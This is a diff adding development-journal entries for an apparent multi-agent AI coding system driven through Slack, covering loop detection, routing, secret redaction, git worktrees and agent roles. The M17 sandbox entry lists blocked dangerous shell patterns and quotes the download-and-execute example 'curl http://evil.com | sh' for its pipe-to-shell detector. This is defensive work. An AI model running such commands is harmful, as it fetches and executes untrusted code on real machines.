@@ -977,3 +977,1526 @@ tool call 3 times = loop), and context compaction (when conversations grow too
 long, summarize old messages). M8 needs it to reconcile Slack thread state with
 agent state on restart — loading the conversation file tells the agent which
 messages it already processed.
+
+---
+
+## 2026-02-26 — M7: Agent Loop Safety
+
+### The problem: agents that loop forever
+
+An LLM agent with tools will sometimes get stuck. It reads a file, gets an
+error, reads the same file again, gets the same error, and repeats until it
+exhausts its turn budget. Worse, it might not even be getting errors — it
+might call the same tool with the same arguments three times in a row because
+the model's response is deterministic for that context. Without detection,
+this burns tokens and wastes time.
+
+### Three detection signals
+
+The `ProgressTracker` watches for three patterns, each with a threshold of 3
+consecutive occurrences:
+
+1. **Same tool + same params** — Hash the tool name and arguments with SHA-256.
+   If the last 3 hashes in the rolling window are identical, the agent is
+   calling the same thing repeatedly. "Same tool, different file" doesn't
+   trigger this — only exact parameter matches.
+
+2. **Same error repeated** — Track error messages from tool results. If the
+   last 3 are identical strings, the agent is hitting the same wall. Different
+   errors (even from the same tool) don't trigger — that indicates the agent
+   is trying different things and getting different failures, which is progress.
+
+3. **No progress** — Hash the assistant's text responses. If 3 consecutive
+   responses are identical, the agent is saying the same thing without making
+   observable progress.
+
+The rolling window is 5 entries (the last 5 tool calls, errors, or responses).
+Detection runs before every LLM call, so it can inject escape prompts before
+the model repeats itself again.
+
+### Four escalating escape strategies
+
+When a stuck condition is detected, the runtime applies strategies in order.
+Each strategy gets 2 turns to break the loop before escalating:
+
+1. **Inject reflection** — Append a user message: "You appear to be in a loop.
+   Stop and reflect." This often works because it changes the context enough
+   that the model generates a different response. Cost: 1 turn.
+
+2. **Force reasoning** — If reflection didn't help, inject: "List every approach
+   you've tried and why each failed. Propose an approach you haven't tried."
+   This forces explicit novelty in the next action.
+
+3. **Reduce tools** — Remove the tool that's causing the loop from the active
+   tool list. If the model was stuck calling Read on the same file, removing
+   Read forces it to try something else (Grep, Bash, or just respond with text).
+   Tools are restored when progress is detected.
+
+4. **Escalate** — Post to the thread: "I'm stuck. Here's what I tried. I need
+   help." Coder escalates to PM. PM and Lead escalate to the user. The agent
+   stops its current activation.
+
+Total cost: max 6 extra turns before the user is asked for help.
+
+### Context compaction
+
+Conversations grow. A Coder working through a 50-file refactor can easily hit
+100K tokens. When the cumulative token usage approaches 80% of the model's
+context window, the runner triggers compaction:
+
+1. Keep the system prompt (never summarized)
+2. Keep the last N assistant+tool pairs verbatim (recent context matters most)
+3. Summarize everything in between via a single-shot LLM call
+4. Replace the middle with the summary as a user message
+
+The summary is a user message, not a system message — per the architecture
+doc. This matters because system messages have special weight in most models,
+and a progress summary shouldn't override the agent's identity prompt.
+
+The compaction config is injectable: `WithCompaction(cfg)` sets the context
+window size, threshold, and how many recent pairs to keep. When not configured,
+no compaction happens — the runner behaves exactly as before.
+
+### Integration with the runner
+
+The runner now creates a `ProgressTracker` by default. Before each LLM call,
+it checks for stuck conditions. After each tool execution, it records tool
+call hashes and errors. When an escape sequence resets (progress detected),
+any removed tools are restored.
+
+The `Result` type gained two new fields: `LoopsDetected` (count of stuck
+signals fired) and `Escalated` (true if all escape strategies were exhausted).
+These feed into the decision log and thread reports in later milestones.
+
+### What's next
+
+M7 completes Phase 2 (Agent Core). Phase 3 starts with M8 (Slack Client),
+connecting the agent loop to Slack via Socket Mode. The safety features from
+M7 will be exercised end-to-end once real conversations flow through the
+system.
+
+---
+
+## 2026-02-26 — M8: Slack Client
+
+### What was built
+
+The Slack integration layer: Socket Mode connection, message sending with
+per-agent identity, file uploads for code snippets, emoji reactions, and
+event deduplication. This is the bridge between the agent loop (M5) and the
+outside world.
+
+### Three components
+
+**DedupSet** — A bounded, TTL-based set that prevents duplicate event
+processing. Slack Socket Mode can deliver the same event multiple times
+during reconnects and retries. The set tracks 10,000 event IDs with a
+5-minute TTL, using a simple `map[string]time.Time` with mutex protection.
+The time source is injectable for testing.
+
+**Client** — Wraps `slack-go/slack` with Socket Mode event handling.
+Receives events, acks them, filters through dedup, extracts message
+content, and dispatches to a registered handler. Sends messages with
+per-agent display name and icon emoji. Handles code snippets (inline for
+<20 lines, file upload for longer). Manages emoji reactions for status
+signaling.
+
+**AgentIdentity** — Maps each agent role to a display name and icon.
+PM gets :clipboard:, Coder gets :hammer_and_wrench:, Reviewer gets :mag:,
+etc. All agents share one Slack bot app but post with distinct identities.
+
+### Design decisions
+
+**Skip bot messages** — The client filters out messages with a `bot_id` to
+prevent self-loops. Without this, an agent posting a response would trigger
+all agents to process their own messages, creating an infinite loop.
+
+**Skip message subtypes** — Slack uses subtypes for edits, deletions, joins,
+and other non-message events. The client only processes plain user messages
+(`SubType == ""`), avoiding wasted LLM calls on thread meta-events.
+
+**Thread fallback** — When a message has no `ThreadTimeStamp`, the client
+uses the message's own timestamp as the thread. This handles top-level
+messages correctly: they become the root of their own thread.
+
+### What's next
+
+M9 (Message Routing & Thread Registry) builds on this client to add
+per-agent message filtering and goroutine-per-thread dispatch. M10 adds
+Block Kit interactive messages for approval flows.
+
+---
+
+## 2026-02-26 — M9: Message Routing & Thread Registry
+
+### What was built
+
+Three components in the `router` package: message filtering (who processes
+what), thread registry (goroutine-per-thread dispatch), and message
+redaction (sensitive content filtering).
+
+### Message filter: simple rules, no model
+
+The routing rules are string matches — no LLM call needed:
+- PM processes messages containing `@codebutler.pm` OR messages with no
+  `@codebutler.*` mention at all (PM is the default handler)
+- All other agents only process messages containing their specific
+  `@codebutler.<role>` mention
+
+A single message can route to multiple agents: `@codebutler.coder
+@codebutler.reviewer` reaches both. This enables the PM to delegate
+review and coding in one message.
+
+### Thread registry: goroutine-per-thread
+
+Each active Slack thread gets its own goroutine via `ThreadRegistry`.
+The design follows the architecture doc: spawn on first message, die
+after 60 seconds of inactivity (~2KB stack cost per idle goroutine),
+respawn on next message.
+
+Workers have a buffered channel inbox (10 messages). Messages are
+processed sequentially within a thread to maintain ordering. Panic
+recovery wraps both the worker's run loop and individual message
+handling, so a panic in one message doesn't kill the worker or affect
+other threads.
+
+### Redaction: microsecond filtering
+
+The `Redactor` runs regex patterns against every outbound message,
+replacing sensitive content with `[REDACTED]`. Built-in patterns catch:
+API keys (OpenAI, Slack, GitHub, AWS, Google), JWTs, private keys,
+database connection strings, and private IP addresses (10.x, 172.16-31.x,
+192.168.x).
+
+Custom patterns can be added via `AddPattern`/`AddPatterns` for per-repo
+overrides from `policy.json`. The redactor is a pure function on text —
+no LLM, no I/O, microsecond latency.
+
+### What's next
+
+M10 (Block Kit & Interactions) adds interactive Slack messages for
+approval flows. Then Phase 4 (Worktree Management) for isolated git
+workspaces.
+
+---
+
+## 2026-02-26 — M10: Block Kit & Interactions
+
+### What was built
+
+Interactive Slack messages using Block Kit for decision points: plan
+approval, destructive tool confirmation, and workflow selection. Plus
+emoji reaction handling for lightweight signals.
+
+### Block Kit builder
+
+`BlockKitMessage` is a simple builder that produces Slack Block Kit JSON:
+header section (bold text), body section (markdown), and an action block
+with buttons. Each button has an `ActionID`, display text, value, and
+optional style ("primary" for green, "danger" for red).
+
+Two presets are provided: `PlanApproval` (Approve/Modify/Reject) and
+`DestructiveToolApproval` (Approve/Reject with the command in a code
+block).
+
+### Fallback to plain text
+
+Every `BlockKitMessage` generates a plain-text version with numbered
+options. If the Block Kit API call fails (missing scope, rendering error),
+`SendBlockKit` falls back to this text automatically. Users reply with
+the option number instead of clicking buttons.
+
+### Interaction routing
+
+`InteractionRouter` dispatches button clicks by `ActionID` to registered
+handlers. `ParseInteractionPayload` extracts the first block action from
+Slack's callback JSON. Emoji reactions are converted to `Interaction`
+values with helper functions: `IsStopSignal` (🛑) and `IsApproveSignal`
+(👍 or approve button).
+
+### What's next
+
+Phase 3 (Slack & Communication) is complete. Phase 4 starts with M11
+(Worktree Management) for isolated git workspaces per coding task.
+
+---
+
+## 2026-02-26 — M11: Worktree Management
+
+### What was built
+
+Git worktree lifecycle management: create isolated workspaces per coding
+task, initialize them per platform, list active worktrees, and clean up
+when done.
+
+### Worktree Manager
+
+The `Manager` struct wraps git worktree commands with a clean API:
+`Create`, `Remove`, `List`, `Init`, `Exists`, `Path`. All git operations
+go through an injectable `CommandRunner` — production uses
+`exec.CommandContext`, tests use a mock that records calls.
+
+`Create` tries `git worktree add -b` first (new branch), then falls back
+to `git worktree add` with an existing branch. This handles both fresh
+tasks and resumed work. If the worktree directory already exists, it
+returns immediately — idempotent on retry.
+
+`Remove` is aggressive: `--force` remove, manual cleanup if git fails,
+prune stale entries, delete local branch, optionally delete remote
+branch. Each step is best-effort — a failure in one doesn't block the
+others.
+
+### Platform detection and init
+
+`DetectPlatform` checks for marker files: `go.mod` (Go), `package.json`
+(Node), `requirements.txt`/`pyproject.toml` (Python), `Cargo.toml`
+(Rust). Go and Rust need no explicit init. Node runs `npm ci`. Python
+creates a venv and installs from `requirements.txt` if present.
+
+### Branch naming
+
+`BranchSlug` generates deterministic branch names from task descriptions:
+lowercase, special chars to hyphens, collapsed doubles, truncated to 50
+chars. Convention: `codebutler/<slug>`. This makes branches self-
+documenting without needing to cross-reference thread IDs.
+
+### What's next
+
+M12 (Git & GitHub Tools) adds commit, push, and PR creation as agent
+tools. M13 adds worktree garbage collection for orphan cleanup.
+
+---
+
+## 2026-02-25 — M12: Git & GitHub Tools
+
+### What was built
+
+Two structs in `internal/github/` that give agents full git + GitHub PR
+capabilities, all idempotent on retry:
+
+**GitOps** (`git.go`) — wraps git CLI commands:
+- `Commit(ctx, files, message)` — stages files, checks for staged changes,
+  commits. No-op if nothing staged (idempotent).
+- `Push(ctx)` — pushes current branch. No-op if "Everything up-to-date".
+- `Pull(ctx)` — pulls with rebase.
+- `HasChanges(ctx)` — checks `git status --porcelain`.
+- `CurrentBranch(ctx)` — reads current branch name.
+
+**GHOps** (`pr.go`) — wraps `gh` CLI for pull request operations:
+- `PRExists(ctx, head)` — checks if a PR exists for a head branch via
+  `gh pr list --head`. Returns nil if none found.
+- `CreatePR(ctx, input)` — creates a PR. **Idempotent**: checks PRExists
+  first, returns existing PR if one already exists for the branch.
+- `EditPR(ctx, input)` — updates title/body via `gh pr edit`.
+- `MergePR(ctx, number)` — squash merges with branch deletion.
+  **Idempotent**: handles "already been merged" gracefully.
+- `PRStatus(ctx, number)` — fetches PR info via `gh pr view`.
+
+### Design decisions
+
+**Injectable CommandRunner pattern.** Both structs accept a `CommandRunner`
+function (`func(ctx, dir, name, args) (string, error)`) via options.
+Production uses `exec.CommandContext`; tests inject a mock that replays
+recorded outputs. This avoids real git/gh calls in tests while verifying
+the exact command sequences.
+
+**Shared CommandRunner type.** `git.go` defines the `CommandRunner` type
+and `defaultRunner` function. `pr.go` reuses them since both are in the
+same package. This avoids duplication while keeping the package cohesive.
+
+**Idempotency as a first-class concern.** Every operation that could be
+replayed on agent restart handles the "already done" case:
+- Commit: `git diff --cached --quiet` returns exit 0 = no changes = skip
+- Push: "Everything up-to-date" in stderr = skip
+- CreatePR: PRExists check before creation = return existing
+- MergePR: "already been merged" in output = skip
+
+This matches the idempotent tool execution requirement from ARCHITECTURE.md.
+
+**JSON structured output from gh.** PRExists and PRStatus use
+`--json number,url,title,state,headRefName` to get structured data instead
+of parsing human-readable output. This is more reliable and avoids
+locale-dependent formatting issues.
+
+### What's next
+
+M13 adds worktree garbage collection — orphan detection, warn/wait/clean
+cycle, and restart recovery. M14 adds seed loading and prompt building.
+
+---
+
+## 2026-02-25 — M13: Worktree Garbage Collection
+
+### What was built
+
+Two modules in `internal/worktree/` for orphan detection and startup recovery:
+
+**GarbageCollector** (`gc.go`) — periodic orphan detection and cleanup:
+- `RunOnce(ctx)` — single GC pass: list worktrees, check each against
+  three orphan criteria, warn or clean as appropriate.
+- `Run(ctx)` — blocking loop that runs RunOnce immediately then every 6h.
+- Orphan detection requires ALL three conditions: 48h+ inactivity, not in
+  coder phase, no open PR for the branch.
+- Warn-wait-clean cycle: first detection posts a warning in the thread,
+  records the warn time. Next pass after 24h grace period triggers cleanup
+  (worktree removal + remote branch deletion + mapping cleanup).
+- Warning resets automatically if the thread becomes active again.
+
+**RecoveryHandler** (`recovery.go`) — startup reconciliation:
+- `Reconcile(ctx)` — compares local worktrees against thread mappings.
+  If thread is gone → immediate cleanup. If worktree has no mapping →
+  flagged as orphaned (left for GC). Active threads left alone.
+- Returns `RecoveryResult` with counts for monitoring.
+
+### Design decisions
+
+**Five interfaces for dependency injection.** The GC needs to check Slack
+threads, PR status, thread phases, send notifications, and read/write
+mappings. Rather than coupling to concrete Slack/GitHub clients, five
+small interfaces (`ThreadChecker`, `PRChecker`, `PhaseChecker`,
+`GCNotifier`, `MappingStore`) allow testing with simple mocks.
+
+**Injectable clock.** The `WithGCClock` option injects `func() time.Time`
+so tests can control time deterministically. This avoids flaky tests that
+depend on wall-clock timing and lets us test the 48h inactivity threshold
+and 24h grace period precisely.
+
+**In-memory GC state.** Warned-at timestamps are kept in a `map[string]time.Time`
+protected by a mutex. On restart, this state is lost — which is fine because
+the recovery handler runs first and handles the immediate cases, while GC
+will re-detect orphans and re-warn them. No persistent state file needed.
+
+**Mapping cleanup for stale entries.** If a mapping exists but no local
+worktree is found, the mapping is cleaned up immediately. This handles
+cases where a worktree was manually deleted or cleaned by another process.
+
+### What's next
+
+M14 adds seed loading and system prompt building — parsing agent MD files
+and assembling the system prompt for each role. M15 adds skill file
+parsing and validation.
+
+---
+
+## 2026-02-25 — M14: Seed Loading & Prompt Building
+
+### What was built
+
+New `internal/prompt/` package with four files:
+
+**seed.go** — seed file loading:
+- `LoadSeed(seedsDir, filename)` — reads a single MD file, strips archived
+  learnings section.
+- `LoadSeedFiles(seedsDir, role)` — loads role seed + global.md + workflows.md
+  (PM only). Returns `SeedFiles` struct.
+- `ExcludeArchivedLearnings(content)` — finds `## Archived Learnings` marker
+  and removes everything from that point onward.
+
+**builder.go** — system prompt assembly:
+- `BuildSystemPrompt(seeds, skillIndex)` — pure function that joins
+  seed + global + workflows + skill index with `---` separators.
+  Only includes non-empty sections.
+
+**skillindex.go** — skill directory scanning:
+- `ScanSkillIndex(skillsDir)` — reads all `.md` files, extracts name
+  (from `#` header or filename), description (first paragraph), and
+  triggers (from `## Trigger` section).
+- `FormatSkillIndex(skills)` — formats as markdown for the PM's prompt.
+
+**watcher.go** — hot-reload cache:
+- `PromptCache` with `Get()` that checks file modification times and
+  rebuilds the prompt when any watched file changes. Thread-safe with
+  RWMutex. `Invalidate()` forces rebuild on next call.
+
+### Design decisions
+
+**Pure builder function.** `BuildSystemPrompt` is a pure function — same
+inputs always produce the same output. No file I/O, no state. This makes
+it trivially testable and composable.
+
+**PM-only sections.** Workflows and skill index are only included for the
+PM role. Other agents don't need workflow knowledge or skill listings —
+they receive specific instructions from PM via @mentions.
+
+**Mod-time based change detection.** The cache checks `os.Stat` mod times
+rather than computing file hashes. This is simpler, faster, and
+sufficient — we only need to know "did anything change", not "what changed".
+
+**Archived learnings exclusion.** Uses simple string scanning for the
+`## Archived Learnings` marker. Everything from that point is stripped.
+This keeps the system prompt focused on current learnings while preserving
+archived content in the file for git history.
+
+### What's next
+
+M15 adds full skill file parsing and validation — structured extraction
+of all skill sections, variable detection, and `codebutler validate`.
+
+---
+
+## 2026-02-25 — M15: Skill Parser & Validator
+
+### What was built
+
+Full skill parsing and validation in `internal/skills/`:
+
+**parser.go** — structured skill file parsing:
+- `ParseSkill(content)` — extracts `# name`, description (first paragraph),
+  `## Trigger` (comma-separated list), `## Agent`, `## Prompt`.
+- Variable extraction: `{param}` from triggers (regex), `{{param}}` and
+  `{{param | default: "value"}}` from prompt (regex with optional default).
+- `ValidateSkill` — checks required sections, valid agent name, undefined
+  variables (in prompt but not in trigger and no default).
+- `ValidateAll` — cross-skill duplicate trigger detection via normalization
+  (lowercase + replace `{param}` with `{}`).
+
+**loader.go** — directory scanning and index building:
+- `LoadIndex(skillsDir)` — reads all `.md` files, parses, validates,
+  builds `Index` with `ByName` lookup map. Invalid skills skipped with
+  warning (not fatal).
+- `Validate(skillsDir)` — reports ALL errors without skipping (for CLI).
+
+**codebutler validate command** — added to `cmd/codebutler/main.go`:
+- `codebutler validate [skills-dir]` — validates all skill files, reports
+  errors with file:message format, exits 1 if any errors found.
+
+### Design decisions
+
+**Two validation modes.** `LoadIndex` skips invalid skills gracefully
+(the system runs with whatever is valid). `Validate` reports everything
+(the developer needs to see all issues). Same underlying validation
+functions, different error handling at the caller level.
+
+**Trigger normalization for duplicate detection.** Triggers like
+`"do {thing}"` and `"do {stuff}"` are duplicates because they'd match
+the same user intent. Normalizing `{param}` to `{}` before comparison
+catches this. Same-name skill triggers are allowed (a skill can have
+multiple triggers).
+
+**Integration test against real seeds.** `TestLoadIndex_RealSkills` loads
+the actual `seeds/skills/` directory. All 13 seed skills loaded and
+validated successfully — this serves as a regression test for the seed
+files themselves.
+
+### What's next
+
+M16 (PM Agent) and M17 (Coder Agent) are next — the first two working
+agents that can handle user requests end-to-end.
+
+---
+
+## 2026-02-25 — M16: PM Agent
+
+### What was built
+
+PM agent implementation in `internal/agent/pm.go` with supporting tools:
+
+**PMRunner** — wraps `AgentRunner` with PM-specific behavior:
+- Pre-classifies user intent before running the agent loop
+- Logs intent classification for metrics/debugging
+- Supports workflow and skill definitions as configuration
+
+**Intent Classification** — deterministic pre-filter:
+- `ClassifyIntent(message, workflows, skills)` — checks skill triggers first
+  (more specific), then workflow keywords (broader), returns ambiguous if no match.
+  This is a pre-filter — the LLM (PM) makes the final decision via its system prompt.
+
+**Dynamic Model Routing**:
+- `ClassifyComplexity(plan)` — keyword-based complexity assessment (simple/medium/complex)
+- `ModelForComplexity(complexity, default)` — maps complexity to model ID
+  (simple→Sonnet, complex→Opus, medium→default)
+
+**Delegation & Menus**:
+- `FormatWorkflowMenu` — formats workflows + skills as a Slack message
+- `DelegationMessage` — creates @codebutler.<role> messages with plan + context
+
+**New Tools** (in `internal/tools/`):
+- `SendMessage` — posts to Slack thread (WRITE_VISIBLE tier)
+- `GitCommit` — stages files + commits (WRITE_VISIBLE, idempotent)
+- `GitPush` — pushes branch (WRITE_VISIBLE, idempotent)
+- `GHCreatePR` — creates PR via gh CLI (WRITE_VISIBLE, idempotent)
+
+### Design decisions
+
+**Intent classification as pre-filter, not final decision.** The deterministic
+classifier catches obvious matches but the LLM always has the final say.
+This avoids false positives from keyword matching while still providing
+useful logging and metrics about classification patterns.
+
+**Tools use thin interfaces.** `GitCommitter`, `GitPusher`, `PRCreator`,
+`MessageSender` — each tool depends on a single-method interface rather than
+on concrete implementations. This makes testing trivial and allows different
+backends.
+
+### What's next
+
+M17 (Coder Agent) creates the builder agent that receives plans from PM
+and implements them in worktrees. M18 wires PM + Coder for end-to-end.
+
+---
+
+## 2026-02-25 — M17: Coder Agent
+
+### What was built
+
+Coder agent implementation in `internal/agent/coder.go` — the builder that
+receives plans from PM and implements them in isolated worktrees.
+
+**CoderRunner** — wraps `AgentRunner` with Coder-specific configuration:
+- `RunWithPlan(ctx, plan, channel, thread)` — injects the PM's plan as the
+  initial user message and runs the agent loop within the worktree context.
+- `CoderConfig` holds worktree path, base/head branches, model, and max turns.
+- `DefaultCoderConfig()` provides sensible defaults (Sonnet, 50 turns, main base).
+
+**Plan Parsing**:
+- `ParsePlan(message)` — extracts the plan body and file references.
+- `ExtractFileRefs(text)` — regex-based extraction of `file.go:42` patterns
+  with deduplication by full match string.
+
+**Sandbox Enforcement**:
+- `SandboxValidator` — validates paths stay within the worktree (rejects
+  absolute paths outside worktree and `..` directory traversal).
+- `ValidateCommand` — blocks dangerous shell patterns: `rm -rf /`, `sudo`,
+  `chmod 777`, `eval`, `> /dev/`, and pipe-to-shell attacks.
+
+**PR Generation**:
+- `PRDescription(plan, filesChanged)` — generates a structured PR description
+  with summary, file listing, and CodeButler attribution.
+
+### Design decisions
+
+**Pipe-to-shell detection via pipe splitting.** The original approach used
+literal `"curl | sh"` pattern matching, which missed `"curl http://evil.com | sh"`
+because the URL sits between `curl` and `| sh`. The fix splits on `|` and
+checks if the right side starts with a shell interpreter (`sh`, `bash`, `zsh`,
+`dash`). This catches any download-then-execute pattern regardless of the
+arguments to the download command.
+
+**File ref dedup by full match string.** `ExtractFileRefs` deduplicates by the
+complete match (e.g., `"internal/auth/handler.go:42"`), not by path alone.
+This means the same file at different line numbers is preserved as separate
+refs — which is the correct behavior when a plan references multiple locations
+in the same file.
+
+**CoderRunner wraps AgentRunner.** Rather than duplicating the agent loop,
+`CoderRunner` embeds `*AgentRunner` and adds Coder-specific initialization.
+The `RunWithPlan` method constructs a `Task` with the plan as the first
+message, then delegates to the standard `Run` loop. All safety features from
+M7 (stuck detection, escape strategies, context compaction) apply automatically.
+
+### What's next
+
+M18 (End-to-End: User → PM → Coder → PR) wires the PM and Coder together
+for the first working flow from Slack message to pull request.
+
+---
+
+## 2026-02-25 — M18: End-to-End: User → PM → Coder → PR
+
+### What was built
+
+Integration tests in `internal/agent/e2e_test.go` that verify the complete
+flow from user feature request to PR creation, with all intermediate steps:
+intent classification, codebase exploration, plan generation, delegation,
+implementation, testing, git operations, and reviewer handoff.
+
+### The main test: TestE2E_UserToPMToCoderToPR
+
+The centerpiece is a 9-phase test that exercises both agents sequentially:
+
+1. **User message** → PM receives "implement a login page with JWT authentication"
+2. **PM intent classification** → deterministic pre-filter matches "implement" workflow
+3. **PM exploration** → PM uses SendMessage, Read, Glob to explore the codebase
+4. **PM plan** → PM produces a text response with `@codebutler.coder` delegation,
+   file:line references, and structured task/context sections
+5. **Plan parsing** → `ParsePlan` extracts file refs, `ClassifyComplexity` routes
+   to Opus (authentication = complex task)
+6. **Coder implementation** → 9 tool calls: Read → Write × 2 → Bash (tests) →
+   GitCommit → GitPush → GHCreatePR → SendMessage (@reviewer handoff) → text response
+7. **Verification** — checks PM intent classification, tool call counts, plan
+   structure, model routing, delegation format, and reviewer handoff
+
+The test uses the existing mock patterns from `runner_test.go`: `mockProvider`
+(sequenced responses), `mockExecutor` (tool result map), plus a new
+`captureSender` that records all messages for verification.
+
+### Supporting tests
+
+- **TestE2E_PMClassifiesToBugfix** — verifies "crash bug" routes to bugfix workflow
+- **TestE2E_CoderSandboxEnforcement** — validates sandbox catches `/etc/passwd` in plan refs
+- **TestE2E_CoderComplexityRouting** — table-driven: typo→simple→Sonnet, auth→complex→Opus
+- **TestE2E_PRDescriptionFromPlan** — verifies PR body includes summary + file list + attribution
+- **TestE2E_DelegationMessageFormat** — checks `@codebutler.coder` + Task + Context sections
+- **TestE2E_CoderRunWithPlan** — verifies `RunWithPlan` passes the plan as a user message
+
+### Design decisions
+
+**Sequential agent execution, not concurrent.** In production, PM and Coder are
+separate OS processes communicating via Slack. In tests, we run them sequentially
+in the same process — PM produces a plan, we extract it, feed it to Coder. This
+tests the contract between agents (plan format, file refs, delegation structure)
+without needing real Slack or multiple processes.
+
+**Mock provider, not mock LLM.** The `mockProvider` returns pre-configured
+responses in order. This means we're testing the wiring (tool dispatch, message
+flow, turn counting, conversation building) not the model's ability to plan or
+code. Model behavior is tested by running real models against sample prompts —
+a separate concern from integration testing.
+
+**Reviewer handoff verified via provider requests.** The `SendMessage` tool call
+with `@codebutler.reviewer` is verified by inspecting the requests sent to the
+mock provider (which include the tool calls from earlier turns). This avoids
+needing a real Slack connection while still verifying the handoff happened.
+
+### What's next
+
+Phase 6 is complete — the first working flow is wired end-to-end. Phase 7
+starts with M19 (Reviewer Agent) and M20 (Lead Agent), adding code review
+and retrospective capabilities.
+
+---
+
+## 2026-02-25 — M19: Reviewer Agent
+
+### What was built
+
+Reviewer agent implementation in `internal/agent/reviewer.go` — the quality
+gate that reviews PRs for security, quality, test coverage, and plan compliance.
+
+**ReviewerRunner** — wraps `AgentRunner` with review-specific behavior:
+- `ReviewWithDiff(ctx, diff, branch, channel, thread)` — injects the diff
+  and structured review protocol as the initial prompt.
+- `CanReview()` — tracks review rounds (max 3 by default).
+- `CurrentRound()` — returns the current round number.
+
+**Structured Review Protocol** — each review prompt requests:
+1. Invariants — what must not break
+2. Risk matrix — security/performance/compatibility/correctness (none/low/medium/high)
+3. Test plan — what tests should exist for the change
+4. Issues — tagged with `[security]`, `[test]`, `[quality]`, `[consistency]`, `[performance]`
+
+**Review Feedback Parsing**:
+- `ParseReviewIssues(text)` — regex-based extraction of tagged issues from
+  reviewer responses. Validates tags against the known set.
+- `FormatReviewFeedback(issues)` — formats issues into the spec's feedback format.
+- `HasBlockers(issues)` — checks if any issue is severity "blocker".
+- `CountByTag(issues)` — tag distribution for metrics.
+
+**Two-Pass Review**:
+- `TwoPassReviewPrompt(diff)` — lightweight first-pass prompt checking only
+  for security vulnerabilities, critical bugs, and missing error handling.
+- `NeedsDeepReview(response)` — returns false if first pass says "LGTM",
+  skipping the expensive full review for clean diffs.
+
+### Design decisions
+
+**Round tracking on the runner, not the protocol.** The `currentRound` counter
+lives on `ReviewerRunner`, not in the review types. This means the same runner
+instance tracks state across multiple `ReviewWithDiff` calls within a thread,
+matching the real-world pattern where one reviewer instance handles the full
+review loop for a PR.
+
+**Issue parsing uses tag validation.** Only `[security]`, `[test]`, `[quality]`,
+`[consistency]`, and `[performance]` are recognized. Unknown tags (like `[typo]`
+or `[opinion]`) are silently ignored. This prevents the reviewer from inventing
+arbitrary categories while keeping the feedback structured.
+
+**Severity inference from content.** Rather than requiring the model to use a
+specific severity format, `ParseReviewIssues` infers severity from keywords:
+"blocker" → blocker, "suggestion" → suggestion, everything else → warning.
+This is more robust than parsing structured severity fields.
+
+### What's next
+
+M20 (Lead Agent) adds mediation, retrospectives, and team learning. M21
+wires the full flow: PM → Coder → Reviewer → Lead → merge.
+
+---
+
+## 2026-02-25 — M20: Lead Agent
+
+### What was built
+
+Lead agent implementation in `internal/agent/lead.go` — the mediator and
+continuous improvement driver that runs retrospectives and evolves team
+knowledge.
+
+**LeadRunner** — wraps `AgentRunner` with Lead-specific functionality:
+- `RunRetrospective(ctx, threadSummary, agentResults, channel, thread)` —
+  builds a structured retrospective prompt from thread context and agent metrics.
+- `Mediate(ctx, dispute, channel, thread)` — handles disagreements between
+  agents with a structured mediation protocol.
+
+**Retrospective Protocol** — each retrospective prompt requests:
+1. 3 things that went well
+2. 3 friction points
+3. 4 proposals: 1 process, 1 prompt, 1 skill, 1 guardrail
+
+**Learning System**:
+- `Learning` struct with when/rule/example/confidence/source schema.
+- `FormatLearning` — renders a learning for agent MD inclusion.
+- `PruneLearnings` — removes low-confidence (<30%) learnings first,
+  then enforces a max count cap by removing oldest entries.
+
+**Thread Reports**:
+- `ThreadReport` struct with per-agent metrics, patterns, deviations, and costs.
+- `NewThreadReport` — builds a report from `*Result` maps with cost estimation.
+- `MarshalReport` — serializes to indented JSON for `.codebutler/reports/`.
+- `FormatUsageReport` — renders a markdown table with per-agent breakdowns.
+
+**Mediation**:
+- `FormatMediationContext` — structures both agents' positions for evaluation.
+- Mediation prompt instructs the Lead to evaluate based on code quality,
+  team efficiency, project conventions, and user intent.
+
+### Design decisions
+
+**Learning pruning is deterministic.** Two-phase pruning: first remove all
+learnings below 30% confidence (these are speculative and likely noise), then
+if still over cap, remove oldest (first in list) entries. This ensures high-
+confidence learnings from recent threads survive while speculative ones from
+early threads are cleaned up. No LLM call needed for pruning.
+
+**Thread report as plain JSON.** The report is a straightforward struct
+serialized with `json.MarshalIndent`. No custom format, no binary encoding.
+The Lead's retrospective fills in qualitative fields; the runtime pre-fills
+metrics from `*Result`. Reports are stored in `.codebutler/reports/` for the
+`/behavior-report` skill to aggregate later.
+
+**Cost estimation as rough blended rate.** The `TotalCost` uses $9/Mtokens
+as a blended rate (between Sonnet's ~$3/$15 and Opus's ~$15/$75 input/output).
+This is intentionally approximate — precise cost tracking requires knowing
+which model each agent used, which isn't stored in `TokenUsage`. Accurate
+cost tracking is deferred to M32 (Token Budgets & Cost Controls).
+
+### What's next
+
+M21 (Full Implement Workflow E2E) wires all four agents together:
+PM → Coder → Reviewer → Lead → merge.
+
+---
+
+## 2026-02-25 — M21: Full Implement Workflow E2E
+
+### What was built
+
+Complete end-to-end integration tests in `internal/agent/full_workflow_test.go`
+verifying the full implement workflow: User → PM → Coder → Reviewer → Lead → done.
+
+**TestFullWorkflow_PMCoderReviewerLead** — the main test exercises all four
+agents sequentially in a single test, verifying every handoff contract:
+
+1. PM receives "add rate limiting", classifies as implement workflow
+2. PM explores codebase (Read, Grep), produces plan with `@codebutler.coder` delegation
+3. Coder receives plan, reads code, writes middleware + tests, edits routes
+4. Coder runs tests, commits, pushes, creates PR, sends `@codebutler.reviewer`
+5. Reviewer reads diff, produces structured review (invariants, risk matrix, test plan, issues)
+6. Reviewer approves and sends `@codebutler.lead`
+7. Lead discusses with agents via SendMessage, produces retrospective (3 well, 3 friction, 4 proposals)
+8. Thread report generated with per-agent metrics
+
+Verifies 6 handoff contracts: PM→Coder (plan format), Coder→Reviewer
+(SendMessage), Reviewer response (structured issues), Reviewer→Lead
+(approval), Lead discussion (SendMessage to agents), report generation.
+
+**TestFullWorkflow_ReviewerFeedbackLoop** — tests the multi-round review:
+Reviewer finds blocker → Coder fixes → Reviewer re-reviews → approved.
+Verifies `HasBlockers()` correctly identifies round 1 issues and that
+round 2 clears them.
+
+**TestFullWorkflow_LeadMediatesDisagreement** — tests the mediation flow
+when Coder and Reviewer disagree on an approach. Uses `FormatMediationContext`
+to structure the dispute.
+
+### Design decisions
+
+**Sequential agent execution.** In production, agents are separate OS processes
+communicating via Slack. In tests, we run them sequentially — PM produces plan,
+plan feeds to Coder, Coder result feeds to Reviewer, etc. This verifies the
+data contracts between agents without requiring real Slack or concurrency.
+
+**Six handoff verifications per test.** Each agent-to-agent transition is
+verified by inspecting either the response text (contains `@codebutler.*`)
+or the provider's recorded requests (contains specific tool calls). This
